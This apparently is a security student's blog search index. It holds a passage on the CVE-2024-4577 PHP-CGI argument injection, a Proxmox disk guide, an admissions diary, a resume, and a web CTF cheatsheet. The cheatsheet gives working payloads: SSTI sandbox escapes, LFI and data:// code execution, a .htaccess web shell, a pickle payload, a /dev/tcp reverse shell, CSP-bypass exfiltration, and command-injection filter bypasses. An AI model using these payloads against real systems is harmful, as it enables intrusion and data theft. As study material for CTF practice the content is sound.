- ，當然，你也可以透過這份文件，找找看其他語系的 windows 有沒有可以 bypass 的字元。 如何利用首先，我們可以來看看 PHP CGI 有哪些參數可以下： 123456789101112131415161718192021❯ php-cgi --help ─╯Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;] php-cgi &lt;file&gt; [args...] -a Run interactively -b &lt;address:port&gt;|&lt;port&gt; Bind Path for external FASTCGI Server mode -C Do not chdir to the script's directory -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory -n No php.ini file will be used -d foo[=bar] Define INI entry foo with value 'bar' -e Generate extended information for debugger/profiler -f &lt;file&gt; Parse &lt;file&gt;. Implies `-q' -h This help -i PHP information -l Syntax check only (lint) -m Show compiled in modules -q Quiet-mode. Suppress HTTP Header output. -s Display colour syntax highlighted source. -v Version number -w Display source with stripped comments and whitespace. -z &lt;file&gt; Load Zend extension &lt;file&gt;. -T &lt;count&gt; Measure execution time of script repeated &lt;count&gt; times. 應該可以馬上發現， -d 參數非常有用，你可以把所有會妨礙你使用 LFI to RCE 的安全選項全部關掉，然後再用偽協議把髒髒的東西都寫進來 123POST http://example.com/?-d%20allow_url_include%3Don%20-d%20auto_prepend%3Dphp%3A%2F%2Finput%2F%0A&lt;?php phpinfo() ?&gt;","link":"/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/"},{"title":"如何使用Parted幫 Proxmox VM 擴充磁碟大小","text":"在開始之前，建議先備份一下，因為我上次用parted的時候沒打單位直接把sda變成32MB大家要小心 點選要更改的 VM -&gt; Hardware -&gt; 要擴容的Hard Disk -&gt; Disk Action -&gt; Resize 進入VM lsblk 看一下是否有新增成功 我這邊是擴容到36GB parted /dev/sda 進入parted，並用 print 查看一下配置 resizepart 你想要resize的part，輸入resize大小 (這邊記得打單位！！) quit 退出 parted 使用 resize2fs 將文件系統擴容 1sudo resize2fs /dev/sda1","link":"/2024/05/14/%E5%A6%82%E4%BD%95%E5%B9%AB-Proxmox-VM-%E6%93%B4%E5%85%85%E7%A3%81%E7%A2%9F%E5%A4%A7%E5%B0%8F/"},{"title":"CTF Cheatsheet - Web","text":"webInformation Leak.git / .svn / .bzr版本控制系統 .git洩漏可用scrabble將整個.git資料夾下載下來並用git 還原 1./scrabble http://www.example.com/ Google Hacking123site:www.example.comintext:&quot;管理介面&quot;filetype:sql GHDB robots.txt .DS_Store .index.php.swp Backup file XSSXSS Payload CSP 怎麼偷資料假設他 Content Security Policy 在亂寫一通的話，可以用 CSP Evaluator 檢查 CSP 沒擋用什麼偷 例如 CSP 只有擋 script ，那就用 &lt;img&gt; 來偷 1script-src 'none'; 如果把連線都擋掉的話，還是可以使用 location.href 或 window.open() 透過跳轉來偷資料 1default-src 'none';script-src 'unsafe-inline'; JSONP允許特定第三方網站引入時，可以嘗試使用 JSONP 引入惡意程式碼 1default-src https://example.com JSONBee DNS prefetch1&lt;link rel=dns-prefetch href=[YOUR_DATA].webhook.trianglesnake.com&gt; WebRTC123456789var pc = new RTCPeerConnection({ &quot;iceServers&quot;:[ {&quot;urls&quot;:[ &quot;turn:74.125.140.127:19305?transport=udp&quot; ],&quot;username&quot;:&quot;_all_your_data_belongs_to_us&quot;, &quot;credential&quot;:&quot;.&quot; }]});pc.createOffer().then((sdp)=&gt;pc.setLocalDescription(sdp); PHP 弱型別判斷 PHP弱型別的安全問題詳細總結 md5()&amp;sha1()12345678md5(array()) ==sha1(array())//true=&gt;error=errormd5(240610708)==0 //true/*md5(240610708)=&gt;'0e462097431906509019562988736854'在弱型別判斷中會做為科學記號和int比較*/sha1('aa3OFF9m')=&gt;'0e36977786278517984959260394024281014729' https://www.cnblogs.com/shijiahao/p/12638484.html https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9 header竄改可偽造ip相關 X-Forward-For Client-IP X-Real-IP SSRFgopher 用法1234567891011gopher://host:port/_HTTPRequest//example POST request:*gopher://192.168.0.1:8888/_POST/index.php?action=login HTTP/1.1Host:127.0.0.1:1000Content-type:application/x-www-form-urlencodedContent-Length:20username=admin&amp;password=bupt666//換行要用%0D%0A(\\r\\n)* 備註：發起POST的四個必要欄位POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11 gopher POST request payload 1gopher://localhost:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20localhost%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%207%0d%0A%0d%0afoo=bar%0d%0A https://hackmd.io/@Lhaihai/H1B8PJ9hX LFI&amp;RFIphp require()&amp;include()偽協議123456789//phpfilterindex.php?file=php://filter/read=convert.base64-encode/resource=target.php//phar 打包成zip下載index.php?file=phar://test.zip/target.php//data:URL schemaindex.php?file=data:text/plain,&lt;?php system('ls');?&gt;index.php?file=data:text/plain;base64,**PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==** data:URL schema更多用法 1234567891011121314#敏感檔案/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 SESSION植入WebShell若session可寫入，可以利用LFI執行php 12寫入&lt;?php system(&quot;ls&quot;);?&gt;index.php?file=/&lt;sess_path&gt;/sess_&lt;your session&gt; session_path可由phpinfo內找到session.save_path，若無則放在/tmp內 /var/lib/php/session session檔名為sess_&lt;session id&gt; freebuf-LFI JS prototype pollution基於 JS 原型鏈的攻擊手法：Prototype Pollution 當javascript在呼叫內建函式時，會透過prototype找上一層要呼叫的函式(因為內建函式並沒有真正在乎叫的物件之中)舉例來說: 12var lst = ['test']console.log(lst.toString()) toString()不可能每個宣告的Array Object都有toString()，當呼叫時必須透過prototype找到上一層然後呼叫Array.toString 所以其實在呼叫lst.toString()的時候其實是呼叫了Array.prototype.toString() 而哪些object的prototype是甚麼則定義在object的__proto__裡面 1lst.__proto__.toString == Array.prototype.toString //true 因此，在一些情況下，有些功能可能造成prototype可以被竄改，進而導致prototype pollution parse query在對於Array進行賦值的時候，攻擊者可以透過構造key為__proto__達到prototype pollution 12345678910111213141516171819202122//parseQuery function回傳一個parsed的dictfunction parseQuery(queryString) { const params = {}; queryString.split('&amp;').forEach(param =&gt; { const [key, value] = param.split('='); params[key] = value; }); return params;}// Example usageconst userInput = 'user=admin&amp;isAdmin=true';// Parsing user inputconst parsedQuery = parseQuery(userInput);console.log(parsedQuery); // Output: { user: 'admin', isAdmin: 'true' }// 透過prototype pollution把驗證機制竄改掉，繞過檢查機制parseQuery('user=admin&amp;isAdmin=true&amp;__proto__.isAdmin=true');// isAdmin被竄改，return trueconsole.log({}.isAdmin); // Output: true 合併物件合併物件同樣有可能發生 12345678910111213141516171819202122function merge(a, b) { for(let prop in b) { if (typeof a[prop] === 'object') { merge(a[prop], b[prop]) } else { a[prop] = b[prop] } } }var config = { a: 1, b: { c: 2 }}var customConfig = JSON.parse('{&quot;__proto__&quot;: {&quot;isAdmin&quot;: 1}}')merge(config, customConfig)var obj = {}console.log(obj.isAdmin) 不難看出，其實只要有對Object的key和value進行操作，就很有可能導致prototype pollution .htaccess可影響apache伺服器中資料夾內的檔案 利用指定404、403等錯誤響應文件達成LFI 12ErrorDocument 404 /flag.txtErrorDocument 404 /shell.php 強制解析非php檔案造成RCE 1AddType application/x-httpd-php .txt 將.htaccess本身作為php執行後門 12php_value auto_prepend_file .htaccess#&lt;?php echo system($_GET['cmd']); ?&gt; #為.htaccess的註解符號 若有WAF則可用\\換行繞過 123p\\hp_value auto_prepend_file .htaccess#&lt;?=echo system($_GET['cmd']); ?&gt; 遇到\\時，會接續下一行 https://blog.csdn.net/solitudi/article/details/116666720 Serialize&amp;Deserialize呼叫反序列化時，可能呼叫一些Magic Method 序列化 Value Serialize(PHP) 8459302 i:8459302; TRUE b:1; NULL N; [’x’,1] a:2:{i:0;s:1:”x”;i:1;i:1;} PHP Object的序列化 1234567new Cat(&quot;kitten&quot;) =&gt;O:3:&quot;Cat&quot;:1:{s:4:&quot;name&quot;;s:6:&quot;kitten&quot;;}class Cat{ public $a; =&gt;{s:1:&quot;a&quot;;.....} private $b; =&gt;{s:6:&quot;\\x00Cat\\x00b&quot;;.....} protected $c; =&gt;{s:4:&quot;\\x00*\\x00c&quot;;.....}} 反序列化1234567PHP Magic Method在指定時機自動呼叫magic method__destruct() //Object 被銷毀或garbage collection__wakeup() //unserialize時觸發__call() //被呼叫不存在方法時觸發__toString() //被當成string處理時觸發(如 echo) 12345678**Python Pickle**pickle.dumps()會將資料序列化可寫payloadsimport subprocessclass payload(object): def __reduce__(self): return (subprocess.check_output,(['cat','/flag_5fb2acebf1d0c558'],))再想辦法把payload()塞進dumps裡面 Phar與反序列化1 SSTI(Server Side Template Injection) python Flask預設模板為Jinja2 1234567891011render_template_string(template)#可做一些簡單運算template={{7*7}} =&gt;49{%for item in item_list %} {{ item }}{% if not loop.last %},{% endif %}{%-endfor-%}'''可以import os os.system()嗎? 不行，code是放在sandbox中跑的但可以用config.from_pyfile(filename)執行任意python檔案''' 使用_mro_(Method Resolution Order) bypass Python的Sandbox 12345678910111213141516171819202122[].__class__ =&gt;&lt;class 'list'&gt;#對object 查詢method[].__class__.__mro__ =&gt;(&lt;class 'list'&gt;,&lt;class 'object&gt;)#_mro_可查詢解析物件順序，此時可以發現所有物件的底層皆為object[].__class__.__base__ =&gt;&lt;class 'object'&gt;#_base_可返回最底層的method,所以返回object[].__class_.__base_.__subclasses__()#_subclasses_直接返回所有subclasses，猛了object在最底層，所以所有物件都會return[].__class__.__base__.__subclasses__()[132] =&gt;&lt;class 'os._wrap_close'&gt;#os出現了[].__class__.__base__.__subclasses__()[132].__init__.__globals__ =&gt;返回所有可被global調用的method{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('ls')}}#os.system被A出來了{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}#回傳結果 SSTI Payload更多奇技淫巧:https://tw511.com/a/01/48066.html SQL injectionhttps://www.796t.com/content/1545706659.htmlhttps://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/ Comments1234567891011121314151617181920212223MySQL#comment-- comment [Note the space after the double dash]/*comment*//*! MYSQL Special SQL */PostgreSQL--comment/*comment*/MSQL--comment/*comment*/Oracle--commentSQLite--comment/*comment*/HQLHQL does not support Comments 常見waf1escape()-&gt;被轉成%XX，@* _ + - . /不編碼 waf繞過123'弄不出來的時候可以嘗試兩個urlencode合在一起%bf%27、%df%27、%aa%27 Reversed Shell123最經典nc -klvp [port] #attacker's host/bin/sh -i &gt;&amp; /dev/tcp/[host]/[port] 0&lt;&amp;1 #victim 問就是 revshells.com Commandline Injection截斷指令最基本的截斷可用;達成，也可使用 cmd1&amp;&amp;cmd2當cmd1 執行成功時執行cmd2 cmd1&amp;cmd2簡單拼接，無論cmd1執行成功與否都會執行cmd2 cmd1||cmd2當cmd1執行失敗時執行`cmd2 cmd1|cmd2將cmd1的執行結果以pipeline塞給cmd2 可以將指令包在 \\`或是$()` 之中 空格繞過 使用&lt;&gt;繞過 cat&lt;flag cat&lt;&gt;flag {cat,flag} 使用特殊變量$IFS繞過(預設是空格) cat$IFS./flag cat$IFS\\flag 過濾繞過 regex繞過 /usr/bin/ca? flag 反斜線繞過 ca\\t fl\\ag 空變量繞過 ca${Z}t flag 一些猛料 https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003https://blog.csdn.net/m0_61011147/article/details/126722464 一些會一直旺季的東東 更多筆記https://github.com/splitline/How-to-Hack-Websites https://github.com/splitline/My-CTF-Challenges/ [資安新手入門手冊] Web Security 領航之路 简介 - CTF Wiki https://github.com/w181496/Web-CTF-Cheatsheet","link":"/2024/04/30/CTF-Cheatsheet-Web/"},{"title":"跨科系推甄四大資安所推甄心得","text":"因為網路上資安相關研究所推甄的心得本來就很少，所以寫這篇文給想要跨科系推甄或是有跟我一樣奇怪狀況的人參考。但是還是建議真的有和我一樣狀況的人還是要準備一下考試，不然有機會+365，畢竟不是所有學校都那麼看課外表現。 推甄系所與結果 校系 成績 結果 台大電機資安所 67 落榜 交大資安甲 78.67 備28 清大資安所 書審 88.67 / 口試 91.67 正取 成大電機資安學程 書審 80.34 / 口試 84.34 備6 台大直接落榜、交大備到天邊，其實都和我預期的蠻符合，畢竟我的成績就是一坨💩，讀的科系甚至和電資差了十萬八千里，要靠經歷推上還是有點難度。 個人背景學歷國立成功大學 交通管理科學系 78.78 % 資安相關課程 成大計網中心 關鍵基礎設施資安學程 2023 AIS3 臺灣好厲駭第八屆高階培訓、第九屆導師培訓制度 台南市資安攻防演練 校內資訊相關課程 開課單位 課程名稱 成績 資訊系 程式設計（一） 94 A+ 資訊系 資訊安全 修課中 資訊系 人工智慧導論 75 B 交管系 計算機概論 91 A+ 交管系 計算機程式 95 A+ 交管系 通訊網路 91 A+ 通識 py出跨域首部曲 Python 97 A+ 專題V2X車聯網的攻擊復現與入侵偵測平台 社群參與 NCKU GDSC 資安組組長 成大資安社、B33F 50UP 牛肉湯戰隊共同創辦人 TSCCTF 第一、二屆行政組組長 2024 DEVCORE Conference 會眾 2024 HITCON 會眾 教學經歷 2024 AIS3 TA 2024 AIS3 Junior TA 計算機程式 TA 網路安全實務與社會實踐 TA 其他資安經歷 113年度行政院國家網路攻防演練 攻擊手 AIS3 Pre-Exam &amp; MyFirstCTF 出題者 資訊安全 期末工控CTF 出題者 競賽成績 2023 神盾盃 CTF - Qual 5th / Final 9th 2023 T貓盃 CTF - Qual 2nd / Final 7th 2023 CGGC CTF - Qual 3rd / Final 5th 2024 AIS3 EOF CTF - Final 7th 2024 picoCTF - 29th / 6957 第54屆全國技能競賽南區賽 網路安全職類 - 銅牌 第54屆全國技能競賽全國賽 網路安全職類 - 第四名 2024 HITCON Cyber Range 學生場 - 第二名 實習 DEVCORE Red Team Intern 資策會資安所 工控資安實習 書審準備基本上各校需要繳交的東西都大同小異自傳、讀書計劃、推薦函兩封、歷年成績單 但是交大很搞他要填一個超大坨的表格，會問你修過的課、成績、競賽、專題等，然後競賽專題全部都要填貢獻度請指導老師簽名，建議可以提早開始準備然後台大會需要填一排修課的成績，什麼計組、資結的修課分數然後我全部都沒修過空一排 自傳我是把自傳弄成類似經歷的形式，避免一大坨小作文，根本沒人想看自傳大綱大概長這樣，然後再根據各校要求做微調： 個人簡歷 自我介紹 修課紀錄 資安相關經歷 課外活動參與 曾參與之研究 研究計劃書研究計劃書我其實沒有很認真寫，就寫一些未來想研究的 research proposal ，我是寫Web Security、IoT Security、AI 在資安領域的應用三個，以及近程中程遠程的計劃，一頁之內搞定。 其他有利審查資料就放獎狀、證書吧！ 推薦信推薦信一封我找了之前一起做專案的教授幫忙寫推薦信，另一封請 AIS3 交大的老師幫忙寫，都是要先擬草稿給老師，寫自己的推薦信感覺很臭屁但是還是要盡量把自己做過的事情寫上去，盡量具體一點不要那種很空洞的形容，真的非常感謝兩位願意幫我寫推薦信的教授。 補充一下其實可以找專題教授幫忙寫應該會蠻有幫助的，但我想說已經找到兩位教授了就沒有請第三位教授幫我寫，後來才發現其他人推薦信都五封寫好寫滿 面試準備面試只有成大、清大兩間，基本上沒什麼準備，就上網爬一下文看過去幾年都問了什麼，然後把自己的專題記熟。 成大因為是主場，結果就大意了，去面試的時候什麼都沒帶，和 Kazma 吃麥當勞吃到一半他突然問說誒啊你有帶那個成績單什麼的嗎？然後我才發現我什麼都沒帶，緊急去 7-11 印了一份一頁的英文簡歷，然後發現成績單有加密 ibon 印不出來，爛成大 進去有三關，一關的時間是三分鐘 第一關：蔡邦維教授 Q: 給一隻白板筆，問如果今天實驗室想要架網路，你的架構會長怎樣？可以自己加網路設備或防護設備A: 鬼畫一通大概長這樣： 第二關：李忠憲教授 Q: 請先自我介紹A: 大概講一下最開始怎麼接觸CTF的、比過哪些賽、AIS3助教和DEVCORE的實習 Q: DEVCORE紅隊演練是在幹嘛的？A: 針對企業的網段嘗試入侵、橫向移動、提權、持久化控制，嘗試找出系統的弱點 Q: 有想要考證照嗎？A: 有想，但是證照目前對我來說太貴了，應該會未來進公司或實驗室有補助再去考 Q: 你覺得攻擊比較難還是防守？A: 當然是防守，攻擊只要找到系統的一個最脆弱的地方就可以滲透進去，但是防守卻是要全方位的把所有弱點都補好才可以。 Q: 你怎麼看資安倫理？A: 我比較不敢去亂搞人家的東西，所以所有攻擊都是在對方允許的狀況，或是自己架的環境進行Q: 什麼狀況別人會允許你去打他A: 像紅隊演練就是很經典的例子，企業請你去滲透他的內網看看有沒有什麼問題，然後還有今年參加過行政院的資安攻防演練，就是去打打看政府的網站有沒有什麼漏洞。 這題回答得亂七八糟，因為完全沒料到會問這麼道德層面的問題，回答得好像也不是老師想問的 第三關：劉亦賢教授這關老師有準備兩張紙，一張是C++的程式碼，另一張上面有四個問題 CIA Triad ISO 27001 和 IEC 62443（後面那個有點忘記是這個還是ISO 27701） WAF IDS/IPS/NIDS/HIDS Q: 講一個讓我能對你刮目相看的經歷A: 回答基本上跟上一關的自我介紹差不多 Q: 你是 Com…Communication Management 這是什麼系？電..電信管理還是什麼？（因為我的履歷是英文的所以老師不知道我讀什麼系）A: 額…交…交通管理系，不是電資相關的科系教授：喔喔沒關係沒關係。 Q: 你從這四題裡面挑一題回答A: 我回答第四個Intrusion Detection System，透過payload pattern 或其他偵測方法偵測惡意流量HIDS 是 Host-Based 的 IDS 通常部署在電腦裡面，偵測系統事件，有沒有調用一些可疑的 API Sequence 之類的NIDS Network-Based ，放在網路架構中，可能透過 switch 的 Mirror port 對網路流量做分析，可以是分散式的IPS 是 Intrusion Prevension System ，相較於 IDS 不只會偵測惡意流量還會把可疑的流量直接 ban 掉之前有在自己的 PVE 環境中架過類似的東西（開源的SIEM）教授：你知道 SIEM 和 IDS 、 IPS 不一樣嗎知…知道… Q: 你覺得這段程式碼(C++)可能會有什麼問題（程式碼大概就是有定義一個 structure 然後下面print出一堆 %lld）A: （看了一分鐘）額…因為我比較走 Web 領域所以 binary 比較不熟 我那個時候想說這個程式連個 input 都沒有要怎麼打，到現在還是不知道問題是在哪QQ 清大清大面試五分鐘，其中有三分鐘是自我介紹、兩分鐘教授提問，面試會有三個教授坐在對面 Q: 你還有報哪些研究所？A: 因為未來基本確定要走資安，所以報的都是資安相關研究所，目前是報台清交成的資安研究所 Q: 我看你實務上的經驗已經很夠了，但是研究所主要是做研究的，你有什麼研究成果嗎？A: 之前有和資工系教授合作做 SSDLC 相關案例的研究，專題也是做資安相關的研究，做車路聯網相關的攻擊復現和檢測，未來會比較想研究 Web Security 或 IoT 相關的漏洞研究 清大面超快做兩個小時的車來三分鐘就面完了，感謝潘茗脩及門及地機車接送，然後半路遇到大正百寶能、被早午餐店坑，新竹風真的超級大 後記感謝一路上幫助我的人們，牛肉湯的大家、幫我寫推薦信的老師們，等結果的兩個禮拜每天都不用睡等到精神耗弱快中風，做夢都會夢到推甄的東西，還好最後還是有學校唸，我愛大家","link":"/2024/11/18/%E8%B7%A8%E7%A7%91%E7%B3%BB%E6%8E%A8%E7%94%84%E5%9B%9B%E5%A4%A7%E8%B3%87%E5%AE%89%E6%89%80%E6%8E%A8%E7%94%84%E5%BF%83%E5%BE%97/"}],"tags":[{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"command injection","slug":"command-injection","link":"/tags/command-injection/"},{"name":"SQLi","slug":"SQLi","link":"/tags/SQLi/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"misc","slug":"misc","link":"/tags/misc/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"argument injection","slug":"argument-injection","link":"/tags/argument-injection/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"proxmox","slug":"proxmox","link":"/tags/proxmox/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"研究所","slug":"研究所","link":"/tags/%E7%A0%94%E7%A9%B6%E6%89%80/"},{"name":"推甄","slug":"推甄","link":"/tags/%E6%8E%A8%E7%94%84/"},{"name":"資安","slug":"資安","link":"/tags/%E8%B3%87%E5%AE%89/"}],"categories":[{"name":"Cybersecurity","slug":"Cybersecurity","link":"/categories/Cybersecurity/"},{"name":"CTF","slug":"Cybersecurity/CTF","link":"/categories/Cybersecurity/CTF/"},{"name":"CVE","slug":"Cybersecurity/CVE","link":"/categories/Cybersecurity/CVE/"},{"name":"Writeup","slug":"Cybersecurity/CTF/Writeup","link":"/categories/Cybersecurity/CTF/Writeup/"},{"name":"Others","slug":"Others","link":"/categories/Others/"},{"name":"Cheatsheet","slug":"Cybersecurity/CTF/Cheatsheet","link":"/categories/Cybersecurity/CTF/Cheatsheet/"}],"pages":[{"title":"Chun-Lin She","text":"Email: main@trianglesnake.com GitHub: TriangleSnake LinkedIn: Chun-Lin She Education國立成功大學交通管理科學系September 2021 - Present Skills Programming: Python, C++, JavaScript Cybersecurity Skills: Web Exploitation, Reverse Engineering, Packet analysis Software &amp; Tools: Unix Shell, IDA, Ghidra, Wireshark, Burpsuite Courses and Program 2023 AIS3 新型態資安實務暑期課程網頁安全組July 2023 教育部先進資通安全實務人才培育計畫-112年度資安實務導師制度 臺灣好厲駭-培訓學員高階培訓September 2023 - Present 教育部 x 國立成功大學 關鍵基礎設施資安學程September 2023 - Present 人工智慧學分學程July 2023 - Present 台南市政府資安攻防演練July 2023 Cybersecurity Experience NCKU Google Developer Student ClubCore member, Head of cybersecurity groupJune 2022 - April 2023 計算機程式課程助教February 2023 - June 2023 資訊安全課程期末 CTF 出題者February 2023 - June 2023 成大資安社、CTF戰隊 B33F 50UP共同創辦人、教學長September 2023 - Present TSCCTF (Taiwan Security Club Capture the Flag Contest)行政組組長September 2023 - Present 113年度行政院國家網路攻防演練資通系統實兵演練攻擊手2024 2024 AIS3 新型態資安實務暑期課程MFCTF &amp; AIS3 Pre-Exam 出題者TA Awards 2023 神盾盃 CTF - Qual 5th / Final 9th 2023 T貓盃 CTF - Qual 2nd / Final 7th 2023 CGGC CTF - Qual 3rd / Final 5th 2024 AIS3 EOF CTF - Final 7th 2024 picoCTF - 29th / 6957 第54屆全國技能競賽南區賽 網路安全職類 - 銅牌 第54屆全國技能競賽全國賽 網路安全職類 - 第四名 2024 HITCON Cyber Range 學生場 - 第二名 Work Experience DEVCORERed Team InternSeptember 2024 - Present 資訊與工業策進會 資安科技研究所InternshipFebruary 2024 - Present","link":"/about/index.html"}]}